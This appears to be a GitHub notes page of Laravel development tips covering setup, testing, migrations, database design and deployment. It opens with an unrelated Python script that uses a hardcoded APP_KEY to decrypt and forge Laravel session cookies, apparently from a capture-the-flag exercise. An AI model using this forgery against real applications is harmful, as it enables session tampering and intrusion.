


##
#
https://github.com/jdevfullstack-tutorials/laravel-hacks
#
##


```
import os
import json
import hashlib
import sys
import hmac
import base64
import string
import requests
from Crypto.Cipher import AES
from phpserialize import loads, dumps

#https://gist.github.com/bluetechy/5580fab27510906711a2775f3c4f5ce3

def mcrypt_decrypt(value, iv):
    global key
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.decrypt(value)


def mcrypt_encrypt(value, iv):
    global key
    AES.key_size = [len(key)]
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.encrypt(value)


def decrypt(bstring):
    global key
    dic = json.loads(base64.b64decode(bstring).decode())
    mac = dic['mac']
    value = bytes(dic['value'], 'utf-8')
    iv = bytes(dic['iv'], 'utf-8')
    if mac == hmac.new(key, iv+value, hashlib.sha256).hexdigest():
        return mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))
        #return loads(mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))).decode()
    return ''


def encrypt(string):
    global key
    iv = os.urandom(16)
    #string = dumps(string)
    padding = 16 - len(string) % 16
    string += bytes(chr(padding) * padding, 'utf-8')
    value = base64.b64encode(mcrypt_encrypt(string, iv))
    iv = base64.b64encode(iv)
    mac = hmac.new(key, iv+value, hashlib.sha256).hexdigest()
    dic = {'iv': iv.decode(), 'value': value.decode(), 'mac': mac}
    return base64.b64encode(bytes(json.dumps(dic), 'utf-8'))

app_key ='HyfSfw6tOF92gKtVaLaLO4053ArgEf7Ze0ndz0v487k='
key = base64.b64decode(app_key)
decrypt('eyJpdiI6ImJ3TzlNRjV6bXFyVjJTdWZhK3JRZ1E9PSIsInZhbHVlIjoiQ3kxVDIwWkRFOE1sXC9iUUxjQ2IxSGx1V3MwS1BBXC9KUUVrTklReit0V2k3TkMxWXZJUE02cFZEeERLQU1PV1gxVForYkd1dWNhY3lpb2Nmb0J6YlNZR28rVmk1QUVJS3YwS3doTXVHSlhcL1JGY0t6YzhaaGNHR1duSktIdjF1elwvNXhrd1Q4SVlXMzBrbTV0MWk5MXFkSmQrMDJMK2F4cFRkV0xlQ0REVU1RTW5TNVMrNXRybW9rdFB4VitTcGQ0QlVlR3Vwam1IdERmaDRiMjBQS05VXC90SzhDMUVLbjdmdkUyMnQyUGtadDJHSEIyQm95SVQxQzdWXC9JNWZKXC9VZHI4Sll4Y3ErVjdLbXplTW4yK25pTGxMUEtpZVRIR090RlF0SHVkM0VaWU8yODhtaTRXcVErdUlhYzh4OXNacXJrVytqd1hjQ3FMaDhWeG5NMXFxVXB1b2V2QVFIeFwvakRsd1pUY0h6UUR6Q0UrcktDa3lFOENIeFR0bXIrbWxOM1FJaVpsTWZkSCtFcmd3aXVMZVRKYXl0RXN3cG5EMitnanJyV0xkU0E3SEUrbU0rUjlENU9YMFE0eTRhUzAyeEJwUTFsU1JvQ3d3UnIyaEJiOHA1Wmw1dz09IiwibWFjIjoiNmMzODEzZTk4MGRhZWVhMmFhMDI4MWQzMmRkNjgwNTVkMzUxMmY1NGVmZWUzOWU4ZTJhNjBiMGI5Mjg2NzVlNSJ9')
#b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"vYzY0IdalD2ZC7v9yopWlnnYnCB2NkCXPbzfQ3MV\\";s:8:\\"username\\";s:8:\\"guestc32\\";s:5:\\"order\\";s:2:\\"id\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/206.189.25.23:31031\\/api\\/configs\\";}}","expires":1605140631}\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e'
encrypt(b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"RYB6adMfWWTSNXaDfEw74ADcfMGIFC2SwepVOiUw\\";s:8:\\"username\\";s:8:\\"guest60e\\";s:5:\\"order\\";s:8:\\"lolololo\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/206.189.25.23:31031\\/api\\/configs\\";}}","expires":1605141157}')
```

Disclaimer : this is not a full Laravel tutorial. Rather, this is a collection of my most encountered situations, solutions and approaches. I'm documenting it because it's really hard to memorize these things even if you do it every single day and when returning to Laravel after a long break.

TOC

Initial Setup
Server Installation
Cloning the Project
.env Config
Composer & Artisan
Installing & Running the Project
Ignore The Platform Flag
Unit & Integration Testing
Database Testing
Why Unit Tests ?
Safely Deleting A Module
New Routes In Backend
New Package Installation
Adding New Column/s To A Table
Database Interaction
Eloquent & Laravel Query Builder
Joining Tables
Surrogate Key or Natural Key
Database Normalization & Denormalization
Deploying Laravel On Test / Production Servers
Amazon EC2
WinSCP & PuTTY
Git Pull or Manual File Transfer
Different ENVs
Continuously Run Laravel On Test / Prod Env
Initial Setup
Server Installation
Laravel has its own server when you run

php artisan serve

but that's not complete particularly when you need a database like MySQL, so we need to install a development server.

On Windows OS for the local development environment, we need XAMPP. Go ahead and install it.

Cloning the Project
Most common way is to git clone.

If private, once you have access to the repo, you can clone it. If public, just clone it.

And make sure that it is inside the htdocs folder of XAMPP.

Another option is to simply download the project from GitHub. But you don't get the history of the project.

.env Config
Create a new text file name .env inside the root of the project.

Ask the concerned person for the exact content of the .env file if this is private.

If public, mostly it's the example.env, so go ahead copy the content of it and paste it on the actual .env.

Ever wonder why we don't include .env on GitHub ?

Because it tends to be different on different machines and usually contains sensitive data, like the API token.

Composer & Artisan
Familiarity with the Composer and Artisan is needed.

composer - is a dependency management tool for PHP

artisan - this is the command line utility of Laravel

more on this here,

https://laravel.com/docs/10.x/installation

Installing & Running the Project
After cloning a project,

composer install

php artisan migrate:fresh --seed

when it's API and you have implemented this

https://dev.to/grantholle/implementing-laravel-s-built-in-token-authentication-48cf

you need to run

php artisan make:token

copy paste the token on the frontend or any other service that will be needing it

then finally, the moment of truth,

php artisan serve
and there you have it, enjoy coding !

Ignore The Platform Flag
If you run the composer install command and you get an error, temporarily we can use --ignore-platform-reqs to bypass the error but it's not a good practice. You need to identify what is causing the error.

For example, when we use an external package QR Code, we need to enable GD Extension, hence edit php.ini and uncomment extension=gd. Then try composer install again.

This way we are installing the same versions of the required packages.

Unit & Integration Testing
In modular approach, you need to tweak the default TestCase and the path so all modules will be tested,

then,

make sure that the api_token is updated on the .env file, it's needed for the access of the endpoints, else all test will simply fail, if there is such authentication

php artisan config:cache

php artisan test

Database Testing
This is very critical as all our tests, particularly backend API will always have the database involved.

In my case, because I followed the generic authentication and that token needs to be pasted so we can call the endpoints, I cannot use Database Migrations and RefreshDatabase, rather what fits in my situation is Database Transactions

https://laravel.com/docs/5.4/database-testing#using-transactions

Why Unit Tests ?
writing Unit Tests makes you realize that each function should do a task that can pass or fail by testing it

allows you to make functions decoupled as much as possible

it's a kind of regression testing where when you add new features to an existing system, you still are at least confident that you are not breaking the codebase by just running the unit tests and still passing them

As for me, the third reason is what I really like the most, because that happens all the time, you just modify or add some new feature then you realize later on, other features are broken because of that.

Safely Deleting A Module
using nwidart/laravel-modules, deleting a module should be handled correctly

php artisan module:disable your_module_name
php artisan cache:clear
delete module directory manually
php artisan cache:clear
other developers that will pull these changes will simply pull it and run

php artisan cache:clear

New Routes In Backend
after pulling and when there are new routes in the backend,

php artisan route:cache

New Package Installation
When a developer installed a new package locally, the composer.json & composer.lock will be updated and this should be pushed to GitHub main / master branch

This way, other developers will not install it the way it was installed like

composer require ...

and we avoid merge conflicts in config files and to keep the same package versions.

Other developers will just run

composer install

after pulling from GitHub main / master branch.

Depending on the package, like if there are modified files in the config directory, we need to run

php artisan config:cache

or

php artisan cache:clear

for the changes to take effect.

Adding New Column/s To A Table
If not yet having the actual data, developers have the freedom to simply add new columns in the original migration file,

but this needs to be migrated as fresh

php artisan migrate:fresh

but we will be losing the data but since it's not actual data, this is acceptable.

Otherwise having the actual data on production server, we must always create a new migration file

php artisan module:make-migration <add_new_column_to_table> ModuleName

and simply run

php artisan migrate

when pushed on GitHub master / main, other developers will simply pull it and migrate too

and there are two conditions here:

set column to nullable - updating the content can have problems in the future particularly if there are existing data on the table, so default null to be safe

column cannot be unique - if it's null and there are existing rows that are null also then it's not unique anymore

after creating or editing the migration file,

we need to update the validation and sanitation code block

then finally, the Store & Update methods of the Controller

unit tests for the new column/s and functionality should be added too

Database Interaction
Eloquent & Laravel Query Builder
In Laravel, it's best to use the Laravel Query Builder and the Eloquent ORM. Why ?

First is because of security, namely SQL injection.

Second, this unifies the syntax whether, for example, you are using MySQL or PostgreSQL.

Joining Tables
I usually use LEFT JOIN in my queries. You can left join more than two tables. Related to this is the choice whether you use Natural Key or Surrogate Key.

Surrogate Key or Natural Key
There is a tendency to use Natural Key as it has meaning and is straightforward. Also, you can easily implement Searching / Filtering using this.

But if the Natural Key has the tendency to be changed, then it's not ideal. It's a headache actually. So, for the very first time, make sure whether a Natural Key will be subjected to change or not.

Database Normalization & Denormalization
If you will not be reaching 100k records or more then it's sufficient to have up to 3rd Normal Form, otherwise, database structure will be too complex. Once reaching 3rd Normal Form, it's now time to denormalize to lessen the number of tables.

Take note also that using purely Surrogate Key violates this, particularly the 3rd Normal Form. It has no relation to the actual table data.

Deploying Laravel on Test / Production Servers
There are so many ways to deploy Laravel, others even have the exact configuration for Laravel only.

Amazon EC2
But as for me, the best is Amazon EC2 because the way you install it remotely is like the way you install it locally, the only difference is that mostly it's using Ubuntu whether it uses Apache or nginx servers. So familiarity with Linux is needed.

WinSCP & PuTTY
To access it remotely, we need WinSCP and it has PuTTY, an open-source terminal emulator.

If you know FTP, you will not find it difficult to use WinSCP, as it is an SFTP and FTP client for Windows. But not usually to transfer files particularly the code. For code, use git pull to pull changes from GitHub.

For modifying server settings, because we are using an FTP client, we can modify without using the default for Linux, like sudo nano ... but rather opening files much like we open it on Notepad.

Git Pull or Manual File Transfer
Make sure that the files you are modifying are outside your project. If that is being tracked by Git and you changed it, you can end up with merge conflicts. This will cause confusion also.

For all Git tracked files, modify it first in local then push to GitHub then pull to your VM. If that is VM specific code and your local will be affected, you can enclose it with a conditional, like it will check whether the env is production / test / local.

Different ENVs
Ever wonder why we have different environments ? Why, for example, we cannot use on our local a production env or test env ? Because it serves differently. For example, in local we can simply run composer update without being bothered much. That's not the case in production setting. So you need a local env to try things out.

As for the Test env, usually this has to do with testing. There is the test server that is usually being accessed by the QA team. It's like a production setup but the debug mode is on.

And finally the production environment, which does not have the debug mode. Imagine returning the details of the server and the errors / bugs. Well, you are giving the hackers the idea of the most vulnerable part of your system.

You don't update the production environment too, as this can ruin the entire production env. Imagine if you have version 1, and 2-3 functionalities of this are deprecated but your code is still using those functionalities then you upgraded to version 2, then boom ... you just ruin your project.

Continuously Run Laravel On Test / Prod Env
When in Test / Production environments, we need to run the application not with

php artisan serve

but rather using pm2

https://pm2.io/docs/runtime/guide/installation/

and follow this

https://awangt.medium.com/run-and-monitor-laravel-queue-using-pm2-dc4924372e03

it can be alongside the frontend if that is separate but on the same VM.
